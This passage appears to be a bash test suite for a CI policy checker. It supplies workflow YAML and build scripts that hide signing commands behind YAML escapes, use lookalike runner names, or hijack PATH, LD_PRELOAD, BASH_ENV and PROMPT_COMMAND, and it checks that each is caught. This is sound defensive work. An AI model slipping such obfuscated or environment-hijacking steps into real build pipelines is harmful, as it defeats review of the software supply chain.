ycase y_h11_matrix "runs-on through a matrix leaf ubuntu-99.99" caught <<'EOF'
jobs:
  j:
    runs-on: ${{ matrix.runner }}
    strategy:
      matrix:
        runner: ["ubuntu-99.99"]
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_h12_direct "runs-on ubuntu-20.04" caught <<'EOF'
jobs:
  j:
    runs-on: "ubuntu-20.04"
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_h12_matrix "runs-on through a matrix leaf ubuntu-20.04" caught <<'EOF'
jobs:
  j:
    runs-on: ${{ matrix.runner }}
    strategy:
      matrix:
        runner: ["ubuntu-20.04"]
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_h13_direct "runs-on ubuntu-18.04" caught <<'EOF'
jobs:
  j:
    runs-on: "ubuntu-18.04"
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_h13_matrix "runs-on through a matrix leaf ubuntu-18.04" caught <<'EOF'
jobs:
  j:
    runs-on: ${{ matrix.runner }}
    strategy:
      matrix:
        runner: ["ubuntu-18.04"]
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_h14_direct "runs-on ubuntu-latest-arm" caught <<'EOF'
jobs:
  j:
    runs-on: "ubuntu-latest-arm"
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_h14_matrix "runs-on through a matrix leaf ubuntu-latest-arm" caught <<'EOF'
jobs:
  j:
    runs-on: ${{ matrix.runner }}
    strategy:
      matrix:
        runner: ["ubuntu-latest-arm"]
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_h15_direct "runs-on ubuntu-24.04-ARM" caught <<'EOF'
jobs:
  j:
    runs-on: "ubuntu-24.04-ARM"
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_h15_matrix "runs-on through a matrix leaf ubuntu-24.04-ARM" caught <<'EOF'
jobs:
  j:
    runs-on: ${{ matrix.runner }}
    strategy:
      matrix:
        runner: ["ubuntu-24.04-ARM"]
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_h16_direct "runs-on ubuntu-24.04-arm64" caught <<'EOF'
jobs:
  j:
    runs-on: "ubuntu-24.04-arm64"
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_h16_matrix "runs-on through a matrix leaf ubuntu-24.04-arm64" caught <<'EOF'
jobs:
  j:
    runs-on: ${{ matrix.runner }}
    strategy:
      matrix:
        runner: ["ubuntu-24.04-arm64"]
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_h17_direct "runs-on ubuntu-" caught <<'EOF'
jobs:
  j:
    runs-on: "ubuntu-"
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_h17_matrix "runs-on through a matrix leaf ubuntu-" caught <<'EOF'
jobs:
  j:
    runs-on: ${{ matrix.runner }}
    strategy:
      matrix:
        runner: ["ubuntu-"]
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_h18_direct "runs-on UBUNTU-LATEST" caught <<'EOF'
jobs:
  j:
    runs-on: "UBUNTU-LATEST"
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_h18_matrix "runs-on through a matrix leaf UBUNTU-LATEST" caught <<'EOF'
jobs:
  j:
    runs-on: ${{ matrix.runner }}
    strategy:
      matrix:
        runner: ["UBUNTU-LATEST"]
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_h19_direct "runs-on trailing space" caught <<'EOF'
jobs:
  j:
    runs-on: "ubuntu-24.04 "
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_h19_matrix "runs-on through a matrix leaf trailing space" caught <<'EOF'
jobs:
  j:
    runs-on: ${{ matrix.runner }}
    strategy:
      matrix:
        runner: ["ubuntu-24.04 "]
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_h20_direct "runs-on trailing newline" caught <<'EOF'
jobs:
  j:
    runs-on: "ubuntu-24.04\n"
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_h20_matrix "runs-on through a matrix leaf trailing newline" caught <<'EOF'
jobs:
  j:
    runs-on: ${{ matrix.runner }}
    strategy:
      matrix:
        runner: ["ubuntu-24.04\n"]
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_h21_direct "runs-on U+2010 hyphen lookalike" caught <<'EOF'
jobs:
  j:
    runs-on: "ubuntu\u201024.04"
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_h21_matrix "runs-on through a matrix leaf U+2010 hyphen lookalike" caught <<'EOF'
jobs:
  j:
    runs-on: ${{ matrix.runner }}
    strategy:
      matrix:
        runner: ["ubuntu\u201024.04"]
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_h22_direct "runs-on U+2024 dot lookalike" caught <<'EOF'
jobs:
  j:
    runs-on: "ubuntu-24\u202404"
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_h22_matrix "runs-on through a matrix leaf U+2024 dot lookalike" caught <<'EOF'
jobs:
  j:
    runs-on: ${{ matrix.runner }}
    strategy:
      matrix:
        runner: ["ubuntu-24\u202404"]
    steps:
      - run: bash bin/build-stage.sh a
EOF
# signers in the YAML-DECODED text (Sonnet #249 r7 R1, the class closed): every workflow and composite action is ALSO scanned over the
# decoded run:, uses: and with: values of every step (the raw-text scan stays; findings are the union)
sigcase() { # sigcase NAME wf|act LABEL ok|caught : the YAML text on stdin is a job's steps (wf: ci.yml) or a composite action's steps
  local d f; d=$(mk "$1")
  if [ "$2" = wf ]; then f="$d/.github/workflows/ci.yml"; { printf 'on: push\njobs:\n  j:\n    runs-on: ubuntu-24.04\n    steps:\n'; cat; } > "$f"
  else f="$d/.github/actions/x/action.yml"; { printf 'name: x\nruns:\n  using: composite\n  steps:\n'; cat; } > "$f"; fi
  local out rc=0; out=$(judge tree "$d") || rc=$?
  if [ "$4" = ok ] && [ "$rc" = 0 ]; then pass=$((pass + 1)); echo "ok   AC1 decoded: $3"
  elif [ "$4" = caught ] && [ "$rc" != 0 ] && grep -E -q "calls|signs provenance" <<< "$out"; then pass=$((pass + 1)); echo "ok   AC1 decoded: $3 (caught: ${out:0:140})"
  else failn=$((failn + 1)); echo "FAIL AC1 decoded: $3 -> rc=$rc ${out:0:300}"; fi; }
sigcase sg_ok_wf wf 'control: a harmless folded plain scalar (workflow)' ok <<'EOF'
      - run: echo
          hello world
EOF
sigcase sg_fold_wf wf 'a plain multi-line scalar YAML folds into cosign sign (workflow)' caught <<'EOF'
      - run: cosign
          sign --yes img
EOF
sigcase sg_dqnl_wf wf 'a double-quoted scalar with an escaped line break (decodes to cosign sign) (workflow)' caught <<'EOF'
      - run: "cosign\
          \ sign --yes img"
EOF
sigcase sg_tab_wf wf 'a double-quoted \t between the words (workflow)' caught <<'EOF'
      - run: "cosign\tsign --yes img"
EOF
sigcase sg_hex_wf wf 'a double-quoted \x63 escape for the c of cosign (workflow)' caught <<'EOF'
      - run: "\x63osign sign --yes img"
EOF
sigcase sg_str_wf wf 'a !!str-tagged double-quoted scalar with a \u0020 escape (workflow)' caught <<'EOF'
      - run: !!str "cosign\u0020sign --yes img"
EOF
sigcase sg_flow_wf wf 'a run: inside a flow-sequence step with a \u0063 escape (workflow)' caught <<'EOF'
      - {run: "\u0063osign sign --yes img"}
EOF
sigcase sg_uses_wf wf 'a uses: string with a \u0070 escape (attest-build-provenance) (workflow)' caught <<'EOF'
      - uses: "actions/attest-build-\u0070rovenance@4d101475d8b20a2381f78447822ac1eab6504dd8"
EOF
sigcase sg_with_wf wf 'a with: value naming witness run with a \x20 escape (scanned too) (workflow)' caught <<'EOF'
      - uses: actions/github-script@4d101475d8b20a2381f78447822ac1eab6504dd8
        with:
          script: "witness\x20run -a slsa -- x"
EOF
sigcase sg_ok_act act 'control: a harmless folded plain scalar (composite action)' ok <<'EOF'
    - run: echo
        hello world
EOF
sigcase sg_fold_act act 'a plain multi-line scalar YAML folds into cosign sign (composite action)' caught <<'EOF'
    - shell: bash
      run: cosign
        sign --yes img
EOF
sigcase sg_dqnl_act act 'a double-quoted scalar with an escaped line break (decodes to cosign sign) (composite action)' caught <<'EOF'
    - shell: bash
      run: "cosign\
        \ sign --yes img"
EOF
sigcase sg_tab_act act 'a double-quoted \t between the words (composite action)' caught <<'EOF'
    - shell: bash
      run: "cosign\tsign --yes img"
EOF
sigcase sg_hex_act act 'a double-quoted \x63 escape for the c of cosign (composite action)' caught <<'EOF'
    - shell: bash
      run: "\x63osign sign --yes img"
EOF
sigcase sg_str_act act 'a !!str-tagged double-quoted scalar with a \u0020 escape (composite action)' caught <<'EOF'
    - shell: bash
      run: !!str "cosign\u0020sign --yes img"
EOF
sigcase sg_flow_act act 'a run: inside a flow-sequence step with a \u0063 escape (composite action)' caught <<'EOF'
    - {shell: bash, run: "\u0063osign sign --yes img"}
EOF
sigcase sg_uses_act act 'a uses: string with a \u0070 escape (attest-build-provenance) (composite action)' caught <<'EOF'
    - uses: "actions/attest-build-\u0070rovenance@4d101475d8b20a2381f78447822ac1eab6504dd8"
EOF
sigcase sg_with_act act 'a with: value naming witness run with a \x20 escape (scanned too) (composite action)' caught <<'EOF'
    - uses: actions/github-script@4d101475d8b20a2381f78447822ac1eab6504dd8
      with:
        script: "witness\x20run -a slsa -- x"
EOF
# (Codex #249 r8 B2) a declared env name counts as read ONLY by a whole "$NAME" word of the parsed command (comments stripped): every
# declared name must be consumed there; a read in a comment, a heredoc, single quotes or a no-op does not count
rawcase a9_comment caught V '"bash bin/build-stage.sh a # \"$V\""' 'a declared env read only in a trailing comment inside the run value (Codex #249 r8 B2)'
rawcase a9_cmtline caught V '"# \"$V\"\nbash bin/build-stage.sh a\n"' 'a declared env read only on a comment line of the block'
rawcase a9_sq caught V '"bash bin/build-stage.sh '"'"'$V'"'"'"' 'a declared env read only inside single quotes'
rawcase a9_noop caught V '": \"$V\"\nbash bin/build-stage.sh a"' 'a declared env read only by the : no-op'
rawcase a9_herestr caught V '"bash bin/build-stage.sh a <<< \"$V\""' 'a declared env read only by a here-string'
rawcase a9_heredoc caught V '"bash bin/build-stage.sh a <<EOF\n\"$V\"\nEOF\n"' 'a declared env read only inside a here-document'
rawcase a9_ok ok V '"bash bin/build-stage.sh a \"$V\" # trailing comment"' 'control: a real whole read with a trailing comment'
rawcase a9_ok2 ok V '"# setup\nbash bin/build-stage.sh \"$V\"\n"' 'control: a real whole read after a comment line'
# (Codex #249 r8 B4, the class closed) a candidate .yml/.yaml anywhere is classified by its PARSED root mapping (jobs or runs -> scanned);
# a workflow-looking or .github/ candidate that does not parse is an error
d=$(mk b9_ind); mkdir -p "$d/$(dirname 'tools/ci/ind.yml')"; printf '  on: push\n  jobs:\n    x:\n      steps:\n        - run: cosign attest --type https://example.invalid/unlisted --predicate p img\n' > "$d/tools/ci/ind.yml"; rc=0; out=$(judge tree "$d") || rc=$?
if [ "$rc" != 0 ] && grep -F -q 'tools/ci/ind.yml' <<< "$out"; then pass=$((pass + 1)); echo "ok   AC1 discovery: an indented root mapping (  jobs:) (Codex #249 r8 B4) is read and caught by name"; else failn=$((failn + 1)); echo "FAIL AC1 discovery: an indented root mapping (  jobs:) (Codex #249 r8 B4) -> rc=$rc ${out:0:240}"; fi
d=$(mk b9_docstart); mkdir -p "$d/$(dirname 'tools/ci/doc.yml')"; printf -- '---\n# a comment\njobs:\n  x:\n    steps:\n      - run: cosign attest --type https://example.invalid/unlisted --predicate p img\n' > "$d/tools/ci/doc.yml"; rc=0; out=$(judge tree "$d") || rc=$?
if [ "$rc" != 0 ] && grep -F -q 'tools/ci/doc.yml' <<< "$out"; then pass=$((pass + 1)); echo "ok   AC1 discovery: a root jobs: after --- and a comment is read and caught by name"; else failn=$((failn + 1)); echo "FAIL AC1 discovery: a root jobs: after --- and a comment -> rc=$rc ${out:0:240}"; fi
d=$(mk b9_crlf); mkdir -p "$d/$(dirname 'tools/ci/crlf.yml')"; printf 'jobs:\r\n  x:\r\n    steps:\r\n      - run: cosign attest --type https://example.invalid/unlisted --predicate p img\r\n' > "$d/tools/ci/crlf.yml"; rc=0; out=$(judge tree "$d") || rc=$?
if [ "$rc" != 0 ] && grep -F -q 'tools/ci/crlf.yml' <<< "$out"; then pass=$((pass + 1)); echo "ok   AC1 discovery: a jobs: file with CRLF line endings is read and caught by name"; else failn=$((failn + 1)); echo "FAIL AC1 discovery: a jobs: file with CRLF line endings -> rc=$rc ${out:0:240}"; fi
d=$(mk b9_flow); mkdir -p "$d/$(dirname 'tools/ci/flow.yml')"; printf '{"jobs": {"x": {"steps": [{"run": "cosign attest --type https://example.invalid/unlisted --predicate p img"}]}}}\n' > "$d/tools/ci/flow.yml"; rc=0; out=$(judge tree "$d") || rc=$?
if [ "$rc" != 0 ] && grep -F -q 'tools/ci/flow.yml' <<< "$out"; then pass=$((pass + 1)); echo "ok   AC1 discovery: a JSON-style flow mapping {\"jobs\": ...} in a .yml file is read and caught by name"; else failn=$((failn + 1)); echo "FAIL AC1 discovery: a JSON-style flow mapping {\"jobs\": ...} in a .yml file -> rc=$rc ${out:0:240}"; fi
d=$(mk b9_runsflow); mkdir -p "$d/$(dirname 'tools/act/flow.yaml')"; printf '{"runs": {"using": "composite", "steps": [{"run": "cosign attest --type https://example.invalid/unlisted --predicate p img", "shell": "bash"}]}}\n' > "$d/tools/act/flow.yaml"; rc=0; out=$(judge tree "$d") || rc=$?
if [ "$rc" != 0 ] && grep -F -q 'tools/act/flow.yaml' <<< "$out"; then pass=$((pass + 1)); echo "ok   AC1 discovery: a flow mapping with runs: (a composite) in a .yaml file is read and caught by name"; else failn=$((failn + 1)); echo "FAIL AC1 discovery: a flow mapping with runs: (a composite) in a .yaml file -> rc=$rc ${out:0:240}"; fi
d=$(mk b9_upper); mkdir -p "$d/$(dirname 'tools/ci/WF.YML')"; printf 'jobs:\n  x:\n    steps:\n      - run: cosign attest --type https://example.invalid/unlisted --predicate p img\n' > "$d/tools/ci/WF.YML"; rc=0; out=$(judge tree "$d") || rc=$?
if [ "$rc" != 0 ] && grep -F -q 'tools/ci/WF.YML' <<< "$out"; then pass=$((pass + 1)); echo "ok   AC1 discovery: an upper-case .YML extension is read and caught by name"; else failn=$((failn + 1)); echo "FAIL AC1 discovery: an upper-case .YML extension -> rc=$rc ${out:0:240}"; fi
d=$(mk b9_tab); mkdir -p "$d/$(dirname 'tools/ci/tab.yml')"; printf 'jobs:\n\tx:\n\t\tsteps: []\n' > "$d/tools/ci/tab.yml"; rc=0; out=$(judge tree "$d") || rc=$?
if [ "$rc" != 0 ] && grep -F -q 'tools/ci/tab.yml' <<< "$out"; then pass=$((pass + 1)); echo "ok   AC1 discovery: a jobs: file indented with tabs (YAML refuses it; fail closed) is read and caught by name"; else failn=$((failn + 1)); echo "FAIL AC1 discovery: a jobs: file indented with tabs (YAML refuses it; fail closed) -> rc=$rc ${out:0:240}"; fi
d=$(mk b9_ghbroken); mkdir -p "$d/$(dirname '.github/broken.yml')"; printf 'a: [unclosed\n' > "$d/.github/broken.yml"; rc=0; out=$(judge tree "$d") || rc=$?
if [ "$rc" != 0 ] && grep -F -q '.github/broken.yml' <<< "$out"; then pass=$((pass + 1)); echo "ok   AC1 discovery: an unparsable .yml under .github/ (fail closed) is read and caught by name"; else failn=$((failn + 1)); echo "FAIL AC1 discovery: an unparsable .yml under .github/ (fail closed) -> rc=$rc ${out:0:240}"; fi
d=$(mk b9_dup); mkdir -p "$d/$(dirname 'tools/ci/dup.yml')"; printf 'jobs: {}\njobs:\n  x: {}\n' > "$d/tools/ci/dup.yml"; rc=0; out=$(judge tree "$d") || rc=$?
if [ "$rc" != 0 ] && grep -F -q 'tools/ci/dup.yml' <<< "$out"; then pass=$((pass + 1)); echo "ok   AC1 discovery: a jobs: file with a duplicate root key (fail closed) is read and caught by name"; else failn=$((failn + 1)); echo "FAIL AC1 discovery: a jobs: file with a duplicate root key (fail closed) -> rc=$rc ${out:0:240}"; fi
d=$(mk b9_ctl); mkdir -p "$d/docs"; printf 'title: x\nsteps:\n  - cosign sign img\n' > "$d/docs/notes2.yml"; expect ok "AC1 discovery: control: a parsed .yml with no jobs:/runs: root key is not scanned" tree "$d"
# ---- final batch (advisor round-9 option A): each class closed, fail closed ----
d=$(mk e_for); setfile "$d" bin/build-stage.sh '#!/usr/bin/env bash\nset -euo pipefail\nfor PATH in /tmp; do :; done\n'; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","trap","printf","read","mapfile","readarray","getopts","declare","local","export","echo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: for PATH in ... sets PATH (B1)" tree "$d"
d=$(mk e_printfv); setfile "$d" bin/build-stage.sh '#!/usr/bin/env bash\nset -euo pipefail\nprintf -v PATH %s /tmp\n'; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","trap","printf","read","mapfile","readarray","getopts","declare","local","export","echo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: printf -v PATH sets PATH" tree "$d"
d=$(mk e_read); setfile "$d" bin/build-stage.sh '#!/usr/bin/env bash\nset -euo pipefail\nread -r PATH <<< x\n'; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","trap","printf","read","mapfile","readarray","getopts","declare","local","export","echo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: read -r PATH sets PATH" tree "$d"
d=$(mk e_mapfile); setfile "$d" bin/build-stage.sh '#!/usr/bin/env bash\nset -euo pipefail\nmapfile -t PATH < f\n'; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","trap","printf","read","mapfile","readarray","getopts","declare","local","export","echo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: mapfile -t PATH sets PATH" tree "$d"
d=$(mk e_readarray); setfile "$d" bin/build-stage.sh '#!/usr/bin/env bash\nset -euo pipefail\nreadarray PATH < f\n'; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","trap","printf","read","mapfile","readarray","getopts","declare","local","export","echo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: readarray PATH sets PATH" tree "$d"
d=$(mk e_getopts); setfile "$d" bin/build-stage.sh '#!/usr/bin/env bash\nset -euo pipefail\ngetopts a PATH\n'; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","trap","printf","read","mapfile","readarray","getopts","declare","local","export","echo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: getopts a PATH sets PATH" tree "$d"
d=$(mk e_declaren); setfile "$d" bin/build-stage.sh '#!/usr/bin/env bash\nset -euo pipefail\ndeclare -n r=BASH_ENV; r=x\n'; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","trap","printf","read","mapfile","readarray","getopts","declare","local","export","echo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: declare -n r=BASH_ENV then r=x sets BASH_ENV" tree "$d"
d=$(mk e_localn); setfile "$d" bin/build-stage.sh '#!/usr/bin/env bash\nset -euo pipefail\nf() { local -n p=PATH; p=/tmp; }\n'; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","trap","printf","read","mapfile","readarray","getopts","declare","local","export","echo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: local -n p=PATH then p=/tmp sets PATH" tree "$d"
d=$(mk e_printfld); setfile "$d" bin/build-stage.sh '#!/usr/bin/env bash\nset -euo pipefail\nprintf -v LD_PRELOAD %s x\n'; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","trap","printf","read","mapfile","readarray","getopts","declare","local","export","echo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: printf -v LD_PRELOAD sets LD_PRELOAD" tree "$d"
d=$(mk e_brace); setfile "$d" bin/build-stage.sh '#!/usr/bin/env bash\nset -euo pipefail\nexport {PATH,X}=1\n'; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","trap","printf","read","mapfile","readarray","getopts","declare","local","export","echo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: export {PATH,X}=1 sets PATH" tree "$d"
d=$(mk e_unset); setfile "$d" bin/build-stage.sh '#!/usr/bin/env bash\nset -euo pipefail\nunset PATH\n'; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","trap","printf","read","mapfile","readarray","getopts","declare","local","export","echo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: unset PATH" tree "$d"
d=$(mk e_dflt); setfile "$d" bin/build-stage.sh '#!/usr/bin/env bash\nset -euo pipefail\necho "${PATH:=/tmp}"\n'; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","trap","printf","read","mapfile","readarray","getopts","declare","local","export","echo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: \${PATH:=/tmp} assigns PATH" tree "$d"
d=$(mk e_bashfunc); setfile "$d" bin/build-stage.sh '#!/usr/bin/env bash\nset -euo pipefail\nexport BASH_FUNC_x%%=1\n'; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","trap","printf","read","mapfile","readarray","getopts","declare","local","export","echo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: a BASH_FUNC_ name" tree "$d"
d=$(mk e_globignore); setfile "$d" bin/build-stage.sh '#!/usr/bin/env bash\nset -euo pipefail\nGLOBIGNORE=x; echo a\n'; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","trap","printf","read","mapfile","readarray","getopts","declare","local","export","echo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: GLOBIGNORE=" tree "$d"
d=$(mk e_promptcmd); setfile "$d" bin/build-stage.sh '#!/usr/bin/env bash\nset -euo pipefail\nPROMPT_COMMAND=id; echo a\n'; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","trap","printf","read","mapfile","readarray","getopts","declare","local","export","echo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: PROMPT_COMMAND=" tree "$d"
d=$(mk e_pyhome); setfile "$d" bin/build-stage.sh '#!/usr/bin/env bash\nset -euo pipefail\necho PYTHONHOME\n'; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","trap","printf","read","mapfile","readarray","getopts","declare","local","export","echo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: a bare PYTHONHOME word (not a read)" tree "$d"
d=$(mk e_comment); setfile "$d" bin/build-stage.sh '#!/usr/bin/env bash\nset -euo pipefail\necho a # PATH=/tmp\n'; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","trap","printf","read","mapfile","readarray","getopts","declare","local","export","echo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: a mention in a comment (fail closed)" tree "$d"
d=$(mk e_assign); setfile "$d" bin/build-stage.sh '#!/usr/bin/env bash\nset -euo pipefail\nPATH=/tmp bash bin/build-apk.sh\n'; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","trap","printf","read","mapfile","readarray","getopts","declare","local","export","echo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: PATH=/tmp as an assignment prefix (already refused)" tree "$d"
d=$(mk e_ifs); setfile "$d" bin/build-stage.sh '#!/usr/bin/env bash\nset -euo pipefail\nIFS=: ; echo a\n'; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","trap","printf","read","mapfile","readarray","getopts","declare","local","export","echo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: IFS=: (already refused)" tree "$d"
d=$(mk e_env); setfile "$d" bin/build-stage.sh '#!/usr/bin/env bash\nset -euo pipefail\nenv PATH=/tmp x\n'; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","trap","printf","read","mapfile","readarray","getopts","declare","local","export","echo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: env PATH=/tmp x (already refused)" tree "$d"
d=$(mk e_ok_read); setfile "$d" bin/build-stage.sh '#!/usr/bin/env bash\nset -euo pipefail\necho "$PATH"\n'; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","trap","printf","read","mapfile","readarray","getopts","declare","local","export","echo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect ok "AC1 script: control: echo \"\$PATH\" is a read" tree "$d"
d=$(mk e_ok_brace); setfile "$d" bin/build-stage.sh '#!/usr/bin/env bash\nset -euo pipefail\necho "${PATH}" "$LD_LIBRARY_PATH"\n'; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","trap","printf","read","mapfile","readarray","getopts","declare","local","export","echo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect ok "AC1 script: control: \${PATH} and \$LD_LIBRARY_PATH are reads" tree "$d"
d=$(mk p_set); setfile "$d" bin/tool.py '#!/usr/bin/env python3\nimport os, subprocess\nos.environ["PATH"] = "/tmp"\n'; edit_spec "$d" 'rows["bin/tool.py"]={"path":"bin/tool.py","tools":[],"signs":False,"runs":[]}'; expect caught "AC1 script (python): os.environ[\"PATH\"] = ... (B1)" tree "$d"
d=$(mk p_putenv); setfile "$d" bin/tool.py '#!/usr/bin/env python3\nimport os, subprocess\nos.putenv("LD_PRELOAD", "x")\n'; edit_spec "$d" 'rows["bin/tool.py"]={"path":"bin/tool.py","tools":[],"signs":False,"runs":[]}'; expect caught "AC1 script (python): os.putenv(\"LD_PRELOAD\", ...)" tree "$d"
d=$(mk p_update); setfile "$d" bin/tool.py '#!/usr/bin/env python3\nimport os, subprocess\nos.environ.update({"PATH": "x"})\n'; edit_spec "$d" 'rows["bin/tool.py"]={"path":"bin/tool.py","tools":[],"signs":False,"runs":[]}'; expect caught "AC1 script (python): os.environ.update({\"PATH\": ...})" tree "$d"
d=$(mk p_setdefault); setfile "$d" bin/tool.py '#!/usr/bin/env python3\nimport os, subprocess\nos.environ.setdefault("PYTHONPATH", "x")\n'; edit_spec "$d" 'rows["bin/tool.py"]={"path":"bin/tool.py","tools":[],"signs":False,"runs":[]}'; expect caught "AC1 script (python): os.environ.setdefault(\"PYTHONPATH\", ...)" tree "$d"
d=$(mk p_subenv); setfile "$d" bin/tool.py '#!/usr/bin/env python3\nimport os, subprocess\nsubprocess.run(["x"], env={"PATH": "/tmp"})\n'; edit_spec "$d" 'rows["bin/tool.py"]={"path":"bin/tool.py","tools":[],"signs":False,"runs":[]}'; expect caught "AC1 script (python): subprocess.run(..., env={\"PATH\": ...})" tree "$d"
d=$(mk p_pop); setfile "$d" bin/tool.py '#!/usr/bin/env python3\nimport os, subprocess\nos.environ.pop("PATH")\n'; edit_spec "$d" 'rows["bin/tool.py"]={"path":"bin/tool.py","tools":[],"signs":False,"runs":[]}'; expect caught "AC1 script (python): os.environ.pop(\"PATH\")" tree "$d"
d=$(mk p_del); setfile "$d" bin/tool.py '#!/usr/bin/env python3\nimport os, subprocess\ndel os.environ["LD_LIBRARY_PATH"]\n'; edit_spec "$d" 'rows["bin/tool.py"]={"path":"bin/tool.py","tools":[],"signs":False,"runs":[]}'; expect caught "AC1 script (python): del os.environ[\"LD_LIBRARY_PATH\"]" tree "$d"
d=$(mk p_str); setfile "$d" bin/tool.py '#!/usr/bin/env python3\nimport os, subprocess\nMSG = "set PATH first"\n'; edit_spec "$d" 'rows["bin/tool.py"]={"path":"bin/tool.py","tools":[],"signs":False,"runs":[]}'; expect caught "AC1 script (python): a PATH mention in a string with no env_mentions exception" tree "$d"
d=$(mk p_ok_get); setfile "$d" bin/tool.py '#!/usr/bin/env python3\nimport os, subprocess\nX = os.environ.get("PATH", "")\n'; edit_spec "$d" 'rows["bin/tool.py"]={"path":"bin/tool.py","tools":[],"signs":False,"runs":[]}'; expect ok "AC1 script (python): control: os.environ.get(\"PATH\") is a read" tree "$d"
d=$(mk p_ok_idx); setfile "$d" bin/tool.py '#!/usr/bin/env python3\nimport os, subprocess\nX = os.environ["PATH"]
Y = os.getenv("PYTHONPATH")\n'; edit_spec "$d" 'rows["bin/tool.py"]={"path":"bin/tool.py","tools":[],"signs":False,"runs":[]}'; expect ok "AC1 script (python): control: os.environ[\"PATH\"] and os.getenv read" tree "$d"
d=$(mk p_ok_exc); setfile "$d" bin/tool.py '#!/usr/bin/env python3\nimport os, subprocess\nMSG = "cosign not found on PATH"\n'; edit_spec "$d" 'rows["bin/tool.py"]={"path":"bin/tool.py","tools":[],"signs":False,"runs":[], "env_mentions": [{"name": "PATH", "text": "cosign not found on PATH", "why": "an error message"}]}'; expect ok "AC1 script (python): control: a message mention listed in env_mentions with its exact text and a reason" tree "$d"
